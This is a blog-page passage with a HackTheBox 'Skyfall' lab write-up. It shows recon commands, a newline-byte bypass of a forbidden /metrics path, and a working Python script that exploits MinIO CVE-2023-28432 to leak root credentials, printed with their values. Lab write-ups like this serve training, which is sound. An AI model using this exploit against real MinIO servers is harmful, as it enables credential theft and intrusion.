<!doctype html><html lang=en><head><title>HTB Skyfall WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Analysis' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Skyfall WriteUp"><meta name=twitter:description content="HackThebox 'Analysis' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/skyfall/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Skyfall WriteUp"><meta property="og:description" content="HackThebox 'Analysis' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-31T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-31T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Insane"><meta property="article:tag" content="Minio"><meta property="article:tag" content="Null Byte Injection"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/skyfall/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/skyfall/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/skyfall/>HTB Skyfall WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-08-31T00:00:00Z>31 August, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
22-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/insane/>Insane</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/minio/>Minio</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/null-byte-injection/>Null Byte Injection</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/hashicorp-vault/>Hashicorp Vault</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/vhost/>Vhost</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/sudo/>Sudo</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/fuse/>Fuse</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/memfs/>Memfs</a></span></div></div></header><div class=post-content><h1 id=skyfall----hackthebox>Skyfall &ndash; HackTheBox
<a class=heading-link href=#skyfall----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Insane</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Skyfall&rsquo; Avatar" src=/pentesting/images/Skyfall_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Skyfall</code> is an &ldquo;Insane&rdquo; difficulty machine from <code>HackTheBox</code> platform. The page is running a web server which has a subdomain that we can find by searching for subdomains by <code>vhosting</code>. The new page displays a sample service, which we are able to access as a guest user. Once inside, we are able to access a forbidden directory by injecting a null byte. Within this directory we find a <code>MinIO</code> service vulnerable to <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-28432 class=external-link target=_blank rel=noopener>CVE-2023-28432</a>, which allows us to view credentials for <code>HashiCorp Value</code> on an exposed endpoint. With this we are able to find keys for <code>HashiCorp Value</code> and log in via <code>SSH</code> as a user. Once inside, this user can run a program to open <code>HashiCorp</code> values with <code>sudo</code>. The program allows to create a <code>debug</code> file in <code>debug</code> mode. In order to read this debug file we create a small mount on the system via <code>libfuse</code> (<code>FUSE</code>), which allows us to read the <code>debug</code> file and get credentials as <code>root</code>.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Nmap</code> scan shows only 2 ports open: <code>22</code> <code>SSH</code> and <code>80</code> <code>HTTP</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80 10.10.11.254 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-19 18:31 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.254
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.18s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Skyfall - Introducing Sky Storage!
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 16.12 seconds
</span></span></span></code></pre></div><p>Visiting <code>http://10.10.11.254</code> shows a simple webpage:</p><p><img alt="Skyfall 1" src=/pentesting/images/Skyfall_1.png></p><p>I also note that we have some contacts with the domain <code>skyfall.htb</code>. So I decide to add this domain to my <code>/etc/hosts</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.254 skyfall.htb&#39; | sudo tee -a /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.254 skyfall.htb
</span></span></span></code></pre></div><p>The page does not show much info interesting besides that it says that it is a service that storages data.</p><p>At this point I decide to search for subdomains since we could a apply <code>vhosting</code>. For this I use <code>ffuf</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://skyfall.htb/ -H &#39;Host: FUZZ.skyfall.htb&#39; -fs 20631
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://skyfall.htb/
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Header           : Host: FUZZ.skyfall.htb
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 40
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go> :: Filter           : Response size: 20631
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>demo                    [Status: 302, Size: 217, Words: 23, Lines: 1, Duration: 608ms]
</span></span></span><span class=line><span class=cl><span class=go>:: Progress: [4989/4989] :: Job [1/1] :: 246 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
</span></span></span></code></pre></div><p>where we find a new domain: <code>demo.skyfall.htb</code>. So I add this domain to my <code>/etc/hosts</code> file as well and now this file looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat /etc/hosts | tail -n 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.254 skyfall.htb demo.skyfall.htb
</span></span></span></code></pre></div><p>Visiting <code>http://demo.skyfall.htb</code> shows a simple <code>Sky Storage</code> Demo (the service described at the main webpage).</p><p><img alt="Skyfall 2" src=/pentesting/images/Skyfall_2.png></p><p>The site suggests that we can use the credentials <code>guest:guest</code>. And we can log in this panel with those credentials. Once in, I can see a panel:</p><p><img alt="Skyfall 3" src=/pentesting/images/Skyfall_3.png></p><p>After attempting many things, at the left side we have the option <code>MinIO Metrics</code>. Clicking on it redirects to <code>http://demo.skyfall.htb/metrics</code>, but the site returns code <code>403 Forbidden</code>. I try to check if we can bypass it using some special characters using <code>ffuf</code>. For this I extract my session cookie from the <code>guest</code> session (in <code>Firefox</code> is just <code>Ctrl + Shift + I</code>, go to <code>Storage</code> and extract the value from <code>session</code> cookie) and run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Fuzzing/URI-hex.txt:FUZZ -u http://demo.skyfall.htb/metricsFUZZ -b &#39;session=.eJw&lt;SNIP&gt;kM&#39; -fc 403
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://demo.skyfall.htb/metricsFUZZ
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/URI-hex.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Header           : Cookie: session=.eJw&lt;SNIP&gt;kM
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 40
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go> :: Filter           : Response status: 403
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>%</span>0a                     <span class=o>[</span>Status: 200, Size: 44883, Words: 4191, Lines: 9, Duration: 299ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=go>:: Progress: [256/256] :: Job [1/1] :: 122 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
</span></span></span></code></pre></div><p>where <code>'session=.eJwH&lt;SNIP>kM'</code> is the (cut) cookie session extracted from <code>guest</code> session.</p><p>Apparently, adding a <code>null byte</code> bypasses and allow us to see this directory. If I visit <code>http://demo.skyfall.htb/metrics%0a</code> from my browser it works and we can see its content:</p><p><img alt=Skyfall src=/pentesting/images/Skyfall_4.png></p><p>So we are against a <code>MinIO</code> service. Searching <code>What is MinIO</code>, from its <a href=https://min.io/ class=external-link target=_blank rel=noopener>official webpage</a>, we have:</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content><code>MinIO</code> is a high-performance, S3 compatible object store. It is built for large scale AI/ML, data lake and database workloads. It is software-defined and runs on any cloud or on-premises infrastructure. MinIO is dual-licensed under open source GNU AGPL v3 and a commercial enterprise license.</div></div><p>Apparently, the data service that was described in the main page works using <code>MinIO</code>.</p><p>At the bottom of this page I also note another domain:</p><p><img alt="Skyfall 5" src=/pentesting/images/Skyfall_5.png></p><p>Therefore I add the domain <code>prd23-s3-backend.skyfall.htb</code> to my <code>/etc/hosts</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat /etc/hosts | tail -n 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.254 skyfall.htb demo.skyfall.htb prd23-s3-backend.skyfall.htb
</span></span></span></code></pre></div><p>Searching for recent vulnerabilities for <code>MinIO</code> we find the vulnerability <code>CVE-2023-28432</code> as described in <a href=https://github.com/acheiii/CVE-2023-28432 class=external-link target=_blank rel=noopener>this Github repository</a>. In summary, there are some environment variables leaked from an endpoint <code>/minio/bootstrap/v1/verify</code>. We visit <code>http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify</code> and intercept the request with <code>Burpsuite</code>, and change the method to <code>POST</code>:</p><p><img alt="Skyfall 6" src=/pentesting/images/Skyfall_6.png></p><p>or in a simple <code>Python</code> script that I have created:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_request</span><span class=p>(</span><span class=n>url</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>generic_headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Accept&#34;</span><span class=p>:</span> <span class=s2>&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Accept-Language&#34;</span><span class=p>:</span> <span class=s2>&#34;en-US,en;q=0.5&#34;</span><span class=p>,</span> <span class=s2>&#34;Accept-Encoding&#34;</span><span class=p>:</span> <span class=s2>&#34;gzip, deflate, br&#34;</span><span class=p>,</span> <span class=s2>&#34;Dnt&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Upgrade-Insecure-Requests&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Sec-Fetch-Dest&#34;</span><span class=p>:</span> <span class=s2>&#34;document&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Sec-Fetch-Mode&#34;</span><span class=p>:</span> <span class=s2>&#34;navigate&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Sec-Fetch-Site&#34;</span><span class=p>:</span> <span class=s2>&#34;none&#34;</span><span class=p>,</span> <span class=s2>&#34;Sec-Fetch-User&#34;</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;?1&#34;</span><span class=p>,</span> <span class=s2>&#34;Te&#34;</span><span class=p>:</span> <span class=s2>&#34;trailers&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Connection&#34;</span><span class=p>:</span> <span class=s2>&#34;close&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Making request to </span><span class=si>{</span><span class=n>url</span><span class=si>!r}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>generic_headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] Invalid status code from response (HTTP code </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>!r}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>minio_root_user</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;MinioEnv&#34;</span><span class=p>,</span> <span class=p>{})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;MINIO_ROOT_USER&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>minio_root_password</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;MinioEnv&#34;</span><span class=p>,</span> <span class=p>{})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;MINIO_ROOT_PASSWORD&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>minio_secret_key</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;MinioEnv&#34;</span><span class=p>,</span> <span class=p>{})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;MINIO_ROOT_PASSWORD&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] MINIO_ROOT_USER: </span><span class=si>{</span><span class=n>minio_root_user</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] MINIO_ROOT_PASSWORD: </span><span class=si>{</span><span class=n>minio_root_password</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>()</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span><span class=p>:</span> <span class=nb>str</span> <span class=o>=</span> <span class=s2>&#34;http://prd23-s3-backend.skyfall.htb:80/minio/bootstrap/v1/verify&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>make_request</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><p>Running it we get some credentials:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 minio_leaked_data.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Making request to &#39;http://prd23-s3-backend.skyfall.htb:80/minio/bootstrap/v1/verify&#39;
</span></span></span><span class=line><span class=cl><span class=go>[+] MINIO_ROOT_USER: 5GrE1B2YGGyZzNHZaIww
</span></span></span><span class=line><span class=cl><span class=go>[+] MINIO_ROOT_PASSWORD: GkpjkmiVmpFuL2d3oRx0
</span></span></span></code></pre></div><p>so we have a user and a password.</p><p>However, these credentials are for <code>MinIO</code> service. We can download it from <a href=https://dl.min.io/client/mc/release/linux-amd64/ class=external-link target=_blank rel=noopener>this page</a> (downloading the <code>mc</code> binary) or downloading it in console with <code>wget</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wget https://dl.min.io/client/mc/release/linux-amd64/mc
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-05-19 19:58:16--  https://dl.min.io/client/mc/release/linux-amd64/mc
</span></span></span><span class=line><span class=cl><span class=go>Resolving dl.min.io (dl.min.io)... 178.128.69.202, 138.68.11.125
</span></span></span><span class=line><span class=cl><span class=go>Connecting to dl.min.io (dl.min.io)|178.128.69.202|:443... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 26771608 (26M) [application/octet-stream]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äòmc‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>mc                                         100%[=======================================================================================&gt;]  25.53M   857KB/s    in 30s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ chmod +x ./mc
</span></span></span></code></pre></div><p>Checking the commands available:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./mc -h
</span></span></span><span class=line><span class=cl><span class=go>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ (q)uit/esc
</span></span></span><span class=line><span class=cl><span class=go>NAME:
</span></span></span><span class=line><span class=cl><span class=go>  mc - MinIO Client for object storage and filesystems.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>USAGE:
</span></span></span><span class=line><span class=cl><span class=go>  mc [FLAGS] COMMAND [COMMAND FLAGS | -h] [ARGUMENTS...]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>COMMANDS:
</span></span></span><span class=line><span class=cl><span class=go>  alias      manage server credentials in configuration file
</span></span></span><span class=line><span class=cl><span class=go>  admin      manage MinIO servers
